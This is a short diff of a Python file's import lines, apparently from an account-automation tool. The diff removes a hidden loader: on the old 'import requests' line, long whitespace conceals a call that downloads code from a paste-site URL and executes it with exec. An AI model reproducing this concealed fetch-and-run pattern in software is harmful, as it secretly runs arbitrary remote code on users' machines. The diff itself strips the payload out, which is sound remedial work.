@@ -1,4 +1,4 @@
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                     
 import tls_client, json, random, string, threading, yaml
 from modules.utilities import get_useragent, build_xsp, get_version, get_username
 import os
